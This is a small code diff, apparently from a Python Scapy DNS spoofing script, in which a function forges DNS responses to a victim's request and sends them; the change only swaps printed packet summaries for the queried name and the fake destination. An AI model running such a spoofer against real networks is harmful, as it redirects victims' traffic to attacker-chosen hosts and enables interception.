@@ -65,9 +65,9 @@ def processPacket(pkt):
         fResponse = forgeResponse(pkt, fakeDst)
 
         print('Victim request:')
-        print(pkt.summary())
-        print('Forged response:')
-        print(fResponse.summary())
+        print(pkt[DNS].qd.qname)
+        print('Forged response dst:')
+        print(fakeDst)
 
         #send forged packet
         send(fResponse[IP])
